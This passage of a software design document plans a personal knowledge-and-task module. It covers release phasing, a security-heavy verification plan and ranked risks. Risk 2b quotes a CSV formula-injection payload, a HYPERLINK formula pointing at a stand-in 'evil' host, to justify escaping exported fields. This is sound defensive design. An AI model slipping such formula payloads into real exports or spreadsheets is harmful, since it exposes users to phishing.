Sync writes entities through the same `lib/framework/obsiddy/repo/*` functions as the API, so invalidation is already handled — the reconciler never touches `prisma.obsiddyTask.update` directly. Embedding is **deferred, never inline**: sync nulls `indexedHash` and the tick backfill picks it up. For a first import of 5000 notes that's the difference between a 4-second sync and a timeout. Add a per-user daily embedding budget.

### Purity

`buildSyncPlan(base, local, remote, layout, policy)` and `mergeEntity(base, local, remote)` are **pure** — no DB, no network. The entire conflict matrix becomes a table-driven unit test with zero mocks, which is what the repo's `testing` skill demands. This is the most important testability decision in the design.

### Vault × sharing

**Shared-in items do NOT sync into the grantee's vault.** Once someone else's note is a file in your vault you _will_ edit it, and now we owe a write-back path across an ownership boundary under a viewer grant — an entire second permission model inside the sync engine. Revocation also becomes unenforceable, and deleting files out of someone's personal Dropbox on a third party's action is appalling behaviour even if we could.

Instead: the owner's own file gets generated `shared: true` / `granted-to: 2` frontmatter (one of the few fields where vault edits do _not_ win), so the owner can see their sharing posture from Obsidian. `/shared-with-me` offers a manual markdown download.

Two more: **a public link must render the DB row, not the vault file** (a mid-flight sync must not change what a public page shows), and **publicly-shared items are exempt from `deletePropagation:'mirror'`** — a stray vault deletion silently 404-ing a link given to 200 people is a bad day.

---

## 15. Phasing

Four releases. **Release 1 is a complete no-Obsidian build** and is the only one that must happen — every later release is optional and additive, and none of them requires a migration against data Release 1 has already written. Commit per phase.

### Release 1 — the second brain (no Obsidian, no sharing UI)

Everything you asked for except vault sync and sharing. Usable daily on its own.

| #   | Deliverable                                                                                                                                                                                                                                                                                                       | Verifiable by                                                                                                           |
| --- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| 0   | **Framework-tier scaffold**: `lib/framework/obsiddy/`, `prisma/schema/framework-obsiddy.prisma`, `.context/framework/obsiddy/` + **`install.md`**, tier `eslint.config.mjs`, dynamic boot `lib/app/bootstrap.ts` → `leaf-bootstrap.ts`, `obsiddyEnvSchema`, `/obsiddy` in `protected-routes.ts`, CHANGELOG bullet | `validate`; **the app still builds with `lib/framework/` deleted** — proves the dynamic import                          |
| 0b  | **Upstream the two missing seams**: `lib/app/maintenance-tasks.ts` (`registerAppMaintenanceTask`) and `lib/app/protected-nav.ts`                                                                                                                                                                                  | Obsiddy touches zero Sunrise-owned files                                                                                |
| 1   | Schema + hand-edited migration + 6 drift probes + `ensureObsiddySpace()`                                                                                                                                                                                                                                          | `db:drift-check` green                                                                                                  |
| 2   | `lib/framework/obsiddy/repo/*` with **`OwnerScope`** + services + validations + CRUD routes (incl. entities)                                                                                                                                                                                                      | route tests incl. cross-user isolation                                                                                  |
| 3   | Priority engine (`manualBoost` + snooze presets + `snoozeCount`) + `/obsiddy/today` + `/obsiddy/inbox` + ETags                                                                                                                                                                                                    | ~40-case table test on the pure scorer                                                                                  |
| 4   | Indexer, `searchObsiddy`, `findConnections` (incl. thought-to-thought), **document ingestion reusing the platform parsers**, `/search`, `/reindex`, `/documents`                                                                                                                                                  | `scripts/framework/obsiddy/smoke-search.ts`; upload a PDF and find it by meaning                                        |
| 5   | UI: layout, Today, Inbox, Projects, Goals, **Entities**, **Documents**, Connections, **Graph** (new dep `d3-force`), forms, quick capture, pin/snooze controls                                                                                                                                                    | manual + component tests                                                                                                |
| 5b  | **Boards** (§12): tags, checklists, board CRUD, `/view` endpoint, kanban UI (new deps `@dnd-kit/core` + `@dnd-kit/sortable`), WIP limits, swimlanes, CSV + JSON export                                                                                                                                            | drag across columns changes `status`; keyboard-only reorder works; CSV imports into a real Trello board                 |
| 6   | 14 capabilities (incl. `obsiddy_upsert_entity`, `obsiddy_ideate`, `obsiddy_get_briefing`) + **`obsiddy-core` agent profile** + 5 agents incl. **`obsiddy-judge`** + explicit guard modes + `output.sources` provenance + seeds 021+ + context contributor + app chat route + chat page                            | a conversation exercising each tool; a claim traces back to its source note                                             |
| 7   | 6 workflows incl. **`obsiddy-morning-briefing`** (`report` + `route` on `workStyle`) + `obsiddy-briefer` agent + `workStyle` setting + briefing button on Today + `ensureObsiddySchedules()` + notification emails                                                                                                | force-tick with cron `* * * * *`; the button returns a stored briefing with no LLM call                                 |
| 7b  | **Platform wiring (§7):** `McpExposedTool` seed rows + a scoped `McpApiKey` → brain usable from Claude Code; `lib/app/admin-nav.ts` section; iOS Shortcut capture; eval dataset + `obsiddy-triage-accuracy` grader                                                                                                | query the brain from Claude Code; run the eval before and after a prompt edit                                           |
| 8   | **Lifecycle:** `archivedAt` + repo base filter + `enforceObsiddyRetention()` + restore routes + archived views + stale digest                                                                                                                                                                                     | clock-shifted retention test; archived items absent from vector search, present in keyword search                       |
| 9   | PWA manifest/icons/share-target + **voice capture** (`useVoiceRecording` + `transcribe`) + **image capture** + `AiApiKey` `obsiddy` scope for iOS Shortcuts + Postmark trigger + `obsiddy_capture_for_token`                                                                                                      | `curl` inbound + Chrome installability + `npm run smoke:transcribe`; record a thought on a phone and find it by meaning |

**Three new npm dependencies — `d3-force` (graph layout), `@dnd-kit/core` and `@dnd-kit/sortable` (board drag).** Document parsing reuses the platform's existing parsers and chunker; `@xyflow/react` is already a dependency. **No new crypto, no per-user credentials** — `lib/security/secret-box.ts` exists only to hold git/cloud tokens, so it does not appear in Release 1 at all.

**Two dormant fields ship in phase 1 anyway** — `rev Int @default(0)` on the six syncable entities, and `'vault'` as an unused value in `ObsiddyLink.origin`. They cost nothing, and their absence would later force a migration and a full-table backfill against live data. Everything else Release 2+ needs is additive.

**Phase 8 is deliberately inside Release 1**, not deferred with the rest of the "nice to have" work. Retention windows have to be columns in the first migration regardless, and both later releases need to know what "archived" means — which folder a file moves to, whether a shared link still resolves. Bolting lifecycle on afterwards means revisiting both.

### Release 2 — sharing

| #   | Deliverable                                                                                                             | Verifiable by       |
| --- | ----------------------------------------------------------------------------------------------------------------------- | ------------------- |
| 10  | Access resolution + `obsiddyVisibilityScope` + owner short-circuit + eslint boundary                                    | isolation tests 1–4 |
| 11  | Public share links: token minting, `/s/[token]` reader, robots + `X-Robots-Tag` + `Referrer-Policy`, revocation, expiry | tests 14–18         |
| 12  | Named grants + cascade + redaction + `/shared-with-me`                                                                  | tests 5–9           |
| 13  | Invite flow + `emails/obsiddy-share-invite.tsx` + rate limit; then comments + commenter role                            | tests 10–13         |
| 14  | Erasure hook + drift probes + grantee-email scrub                                                                       | tests 22–24         |

Cheap — 4–5 days — because `conversation-access.ts`, `invitation-token.ts`, `emails/invitation.tsx`, `visitor-id.ts` and `registerErasureCleanupHook` are all correct existing precedents. The expensive part is the test matrix, and it should be.

Note `visibility` and the `OwnerScope` repo boundary land in Release 1 phases 1–2 even though nothing uses them yet. Retrofitting either onto rows people have already created is what causes leaks.

### Release 3 — markdown export and managed vault

The Obsidian on-ramp, without owning a live sync engine.

| #   | Deliverable                                                                                                                    | Verifiable by                                     |
| --- | ------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------- |
| 15  | **Markdown codec, pure** (new dep `yaml`)                                                                                      | round-trip property tests                         |
| 16  | Vault schema + reconciler + merge, **pure**                                                                                    | full conflict matrix as a table test              |
| 17  | Transport interface + **Zip + Managed + `generateStarterVault`** (new dep `fflate`) + runner + dry-run + snapshot + tick sweep | import a real vault; export; re-import is a no-op |

**Phase 15 is independently shippable and worth doing even if Release 3 stops there.** It's 2–3 days, pure, and gives you "download my entire brain as a folder of markdown" — the honest answer to _"what happens to my data if I stop using this?"_, which for a product other people use will get asked. Someone can drop that export into Obsidian themselves without you owning any sync.

The full release is ~70% of what people mean by "Obsidian support" for ~15% of the cost of Release 4. No credentials, no OAuth, no live-folder conflict cases — because there is no live folder.

### Release 4 — live folder sync

| #   | Deliverable                                                                                                 | Verifiable by                                                              |
| --- | ----------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| 18  | `secret-box` — AES-256-GCM, optional env keys, fail-closed. **Own reviewed commit**                         | key-rotation + AAD-mismatch tests                                          |
| 19  | **Git transport** (new dep `isomorphic-git`) + remote guard + DNS re-check + host allowlist + PAT flow      | manual against a real repo; SSRF suite                                     |
| 19b | **Live Trello API push** (§12) — reuses the same `secret-box` credential store for the per-user key + token | a board creates lists, cards, labels and checklists in a real Trello board |
| 20  | Git webhook, backoff, mass-deletion circuit breaker                                                         | forced-failure runs                                                        |
| 21  | Dropbox. Google Drive only if demanded                                                                      |                                                                            |

Phase 19 is 5–7 days and is the first thing in the whole plan that can fail in production for reasons outside your code. Google Drive is ~8 days of code plus unbounded calendar risk from Google's consent-screen verification — the `drive` scope is restricted and triggers a CASA assessment.

**Stopping after Release 1 or 3 is a legitimate end state**, not a half-built feature. Release 4 is the only one that adds standing operational risk: credentials at rest, outbound network calls to user-supplied hosts, and a background job that writes to someone else's storage.

**Core-file edits: target is zero.** Obsiddy is a framework-tier module, so every edit to a Sunrise-owned file is a merge conflict inflicted on every host project. Phase 0b converts the two that need seams (`run-tick.ts` → `lib/app/maintenance-tasks.ts`; `protected-nav.tsx` → `lib/app/protected-nav.ts`) and upstreams them; `app/robots.ts` is dropped as a requirement in favour of per-page `robots` metadata and `X-Robots-Tag`, which are the stronger controls anyway. **Any PR that touches a Sunrise-owned file should be treated as a design failure and sent back for a seam.**

---

## 16. Verification

1. `npm run validate` + `npm run test:coverage`. `npm run db:drift-check` after **every** subsequent `migrate dev` — non-negotiable.
   1b. **Scorer table test**, pure, no mocks. Beyond the six factors: `manualBoost: +1` outranks the highest-scoring unboosted task; `-1` sinks below the lowest; a boost past `manualBoostExpiresAt` scores **identically to `0`** _without_ any background job having run; `deferUntil` in the future still wins over `manualBoost: +1`; `priorityFactors` reports `base` and `manualBoost` separately; boost values outside `[-1, +1]` are rejected by Zod, not silently clamped at the DB; `snoozeCount` has **no** effect on the score at any value.
   1c. **Lifecycle.** Snooze presets resolve in `ObsiddySpace.timezone`, not server time (assert with the space set to `Pacific/Auckland` while the process runs UTC); an unsnoozed item carries `returnedFromSnooze` on its first appearance only. Retention, clock-shifted: a 91-day-old inbox thought archives, an 89-day-old one doesn't; **a `rejected` `ObsiddyLink` survives every retention pass and the connection sweep still won't re-propose that pair**; `ObsiddyEvent` older than 400 days is pruned. Archive/restore: archiving deletes the item's `ObsiddyEmbedding` rows and it vanishes from `searchObsiddy` but is still found by `?includeArchived=true` keyword search; restoring nulls `indexedHash` and it returns to vector search after a backfill; an archived item with an active share link **still resolves at its public URL**.
2. **Cross-user isolation, the most important suite.** Users A, B, anonymous. B `GET`s A's project → 404 not 403; B's lists and **search** never return A's rows _including when A's row is the better vector match_; B cannot create a row with `userId: A` via the body.
3. **Grants:** cascade shows P's tasks but not their `notes` when `includeTaskDetail` is false; no `ObsiddyLink` from P to a non-shared item; revoke → 404 on the _next_ request; a different signed-in user cannot accept an invite; the wrong-user path doesn't leak the target email unmasked.
4. **Public links:** valid 200; tampered / revoked / expired all 404 with **identical response shape**; payload has no owner email, no other item IDs, no rationale, no priority score; `X-Robots-Tag` + meta robots + `/s/` in robots.txt; a public link grants **no** access to the authenticated route.
5. **AI layer:** A's built context and embeddings contain zero `userId != A` rows, asserted by inspecting the built context **not by mocking**; A's `visibility='link'` item IS in A's own context; a grantee's comment text is absent from A's embeddings.
6. **Erasure:** erase A → all `framework_obsiddy_*` rows gone, B's `/shared-with-me` empty, A's share link 404s, managed-vault blobs deleted. Erase B → A's item survives, the grant is gone, B's _unaccepted_ invite on A's other item is gone, and `b@x.com` appears in **no** row anywhere. Mirror `scripts/smoke/erasure.ts`.
7. **Vault:** the full conflict matrix as a pure table test. **And the single most important sync test — a `obsiddy-id` in an uploaded vault file belonging to user B is treated as a new item for A, not a hijack of B's row.**
8. New `scripts/framework/obsiddy/smoke-end-to-end.ts` (fork-owned path and a
   `framework:obsiddy:*` script name — `scripts/smoke/` and the unprefixed
   `smoke:*` names are Sunrise's, per `CUSTOMIZATION.md` §7 and ask #12) modelled
   on `scripts/smoke/knowledge-hybrid-search.ts`: bootstrap → capture 20 thoughts → reindex → hybrid search → connection sweep → reprioritise → assert the expected task ranks first.
   8f. **Morning briefing.** `GET /obsiddy/briefing` returns the stored briefing with **zero LLM calls** — assert no provider call is made on the happy path. A briefing older than 18 hours triggers regeneration; a fresh one doesn't. `workStyle: 'structured'` and `'exploratory'` produce **materially different selected items**, not just different wording — assert the exploratory briefing contains an unreviewed `ObsiddyLink` the structured one omits, and vice versa for overdue tasks. The "surprise me today" override changes one briefing and leaves `ObsiddySpace.workStyle` unchanged. "Recently achieved" reflects `ObsiddyEvent{kind:'completed'}` in the last 7 days and never includes another user's completions.
   8e. **Capture channels and export hardening.** Record 10 seconds of speech, assert a `ObsiddyThought` lands with `source: 'voice'` and the transcript populated, and that **no audio file is retained**. Photograph text, assert extraction. An `AiApiKey` scoped to `obsiddy` can POST `/obsiddy/capture` and **cannot** reach `/obsiddy/tasks` or any admin route; a revoked key 401s immediately. **CSV export neutralises leading `=`, `+`, `-` and `@`** via `csvEscape` — the formula-injection case, tested explicitly.
   8d. **Platform wiring (§7).** From an MCP client authenticated with user A's key, `obsiddy_search` returns only A's rows and **never B's** — this is the same isolation invariant as the HTTP path but a completely separate entry point, so it needs its own test. An MCP key scoped to `obsiddy-companion` cannot dispatch a capability that agent isn't bound to. The `obsiddy-core` profile's guardrails appear in every agent's resolved prompt (`resolveEffectivePrompt`). A `judge_call` step resolves `obsiddy-judge` rather than failing on a missing agent. The eval dataset runs green against the seeded triage prompt, and a deliberately degraded prompt makes it fail — an eval that can't fail is measuring nothing. Obsiddy agents and workflows survive an export → wipe → import round trip via the existing backup exporter.
   8c. **Boards.** Dragging a card between columns changes `status` and nothing else; dragging to a column top sets `manualBoost` _with_ an expiry. Explicit-board reorder survives a renormalisation pass with the same visual order. A `wipLimit` breach flags but does not block. **Sharing a filter-backed board then creating a matching task makes that task visible to the grantee** — assert it, because it's the leak the design deliberately accepts; then assert the snapshot path does _not_ do this. A shared board exposes no `notes` when `includeTaskDetail` is off, and no `priorityScore` ever. CSV export opens in Trello's importer with lists and labels intact. **Export of a shared-in board is refused.** Keyboard-only: focus a card, move it across columns, save — no mouse.
   8b. **Entities and documents.** _(Phase 5 note: the entity assertion below targets
   `GET /obsiddy/entities/[id]/view`. The generic `[id]` handler stays bare —
   threading `?include=` through `createItemHandlers` would push page-shaped concerns
   into the one factory that guarantees the isolation rules for twenty routes. The
   assertion itself is **proven against a real database** in
   `scripts/framework/obsiddy/smoke-isolation.ts`: two entities, one project linked to
   both, and the checks that each view returns only its own edge and that neither
   user's entities reach the other.)_ Upload one file per supported format (PDF, DOCX, EPUB, CSV, HTML, MD, TXT) and assert each reaches `status: 'ready'` with `chunkCount > 0`; assert a re-upload of the same bytes dedupes on `fileHash`; assert a document is findable by _meaning_ rather than exact wording. Create two entities, link a project to both, and assert `GET /obsiddy/entities/[id]` returns only that entity's linked items — and that user B's entities never appear. Assert entities are **absent** from `score.ts` inputs (a neglected client must not inflate task scores). Assert `/obsiddy/graph?focus=…&depth=1` respects the node cap and excludes archived items.
9. Inbound: `curl -u $POSTMARK_INBOUND_USER:$POSTMARK_INBOUND_PASS` a Postmark-shaped body; assert a thought lands and a replay of the same `MessageID` dedupes.
10. Schedules: set a cron to `* * * * *`, let the dev ticker fire, assert `AiWorkflowExecution.userId` equals the schedule creator and a `ObsiddyReview` appears.
11. PWA: DevTools → Application → Manifest → Installability; Android share sheet → `/obsiddy/capture` prefilled.

---

## 17. Risks, ranked by likelihood of biting

1. **Prisma migration drift** — every `migrate dev` emits DROPs for 5 raw-SQL objects + the FK, and a dropped HNSW index degrades silently to seq-scan. _The six drift probes are the only thing standing between you and this._
2. **Spurious sync conflicts from formatting noise** — YAML key order, quote style, CRLF, Obsidian's own frontmatter rewriting. Fires day one and permanently destroys trust. _Normalise before hashing; separate body hash; treat "both changed, same result" as clean; dry-run showing the real diff._
3. **First-sync embedding cost blow-up** — 5000 notes re-embedded on every frontmatter tick. _No `updated:` in frontmatter, hash semantic content only, defer to the tick, per-user daily budget, `rev` counters._
4. **Mass-deletion blast** — wrong folder, empty clone, Drive permission blip. _`deletePropagation:'none'` default, 10%/50-file breaker, mandatory snapshot, tombstones._
5. **Embedding-dimension lock** — `vector(1536)` is baked into the column; swapping the active model breaks every brain query with a cast error. _Port `assertActiveModelMatchesStoredVectors()`._
   5b. **Filtered HNSW search silently under-returning** — if archived items stayed in the vector index behind a `WHERE archivedAt IS NULL` filter, recall would degrade as history grows, with no error and no obvious symptom. _Archiving deletes the embedding rows outright (§11); the index only ever holds live data._
   5c. **Pruning `rejected` links** — looks like dead data, is actually the tombstone stopping the weekly sweep re-proposing the same connection forever. _Comment it in the retention table; cover it with a test._
6. **Credential storage is genuinely new infrastructure** — no encryption exists, and the schema's own comments enshrine "the DB is admin-trusted", a norm that does not survive user-owned third-party tokens.
   6b. **Shared filter-backed boards silently widening.** A board shared as a live query keeps sharing tasks you create later. This is intended behaviour and still the most likely way someone leaks something through this product. _Plain-English filter disclosure in the share dialog, a live match count, and a one-click "share a snapshot instead" (§13)._
   6c. **Task-level access checks going per-row.** Tasks are now shareable and are the highest-cardinality table; a board view resolving access per card is both a performance cliff and the place an omission hides. _`resolveObsiddyAccessMany` only, asserted by a test that fails on N+1 access queries._
   1b. **Portability rot.** The failure mode isn't dramatic — it's one core-file edit "just this once", one seed numbered against the host, one hard-coded `/obsiddy` prefix. Install #2 then costs a week of archaeology instead of a checklist. _Zero-core-file rule enforced at review; `install.md` kept current every phase; a CI check that the app builds with `lib/framework/` removed._
   2b. **CSV formula injection on export.** A task titled `=HYPERLINK("http://evil","Q4 plan")` exported to CSV becomes a live formula the moment it opens in Excel or Sheets — and board export is a feature you'd hand to other people. _Every exported field goes through `csvEscape()` from `lib/api/csv.ts`; a test asserts a leading `=`, `+`, `-` or `@` is neutralised._ Cheap to fix, invisible until someone gets phished by their own board.
   6d. **MCP is a second front door to the same data.** Every isolation guarantee proven over HTTP has to hold over MCP too, and it's a path that's easy to forget when adding a capability. _`userId` comes from `auth.createdBy` (verified), never from a tool argument; `requireObsiddyUser` throws when it's absent; the isolation suite runs over both entry points._
7. **Access-check omission on the 41st new endpoint.** _Owner-vs-shared repo split + eslint boundary + separate `/shared/*` surface, so the default new endpoint is owner-scoped and safe._
8. **Email userId routing** — the one place the context-derived-userId invariant is bent. Without the sender check, anyone who learns the inbox address can inject thoughts into someone's brain.
9. **`obsiddy-id` trust** — a vault file naming another user's row. _Always scope ID lookups by `userId`; never a bare `findUnique({where:{id}})` in the sync path._
10. **Git remote SSRF** — no DNS resolution in `checkSafeProviderUrl`, and git URLs are 100% user-supplied. _Host allowlist by default, DNS re-check, https-only, redirect re-check._
11. **Context-block bloat** — injected on every turn, grows with the user's data. _Cap ~1200 tokens, log the count._
12. **Background LLM cost** — the orchestrator recruits agents across 3 rounds. _`budgetLimitUsd` on the step and `maxCostPerExecutionUsd` on the workflow; watch `AiCostLog` for a fortnight._
13. **Maintenance-tick contention** — vault sync is the first genuinely slow, network-bound per-user task in a chain guarded by one boolean and a 5-minute watchdog. _Batch of 5, `SKIP LOCKED`, 60s budget, set `nextSyncAt` before working._
14. **Production scheduling** — without external cron hitting the tick, all background intelligence silently never runs and it looks like the feature is broken.
15. **Google Drive OAuth verification** — months of calendar risk, not code risk.
16. **Obsidian Sync racing our sync** on the same folder. No technical fix — document it, and _detect_ it (remote version changing between `list()` and `read()` → abort the run).
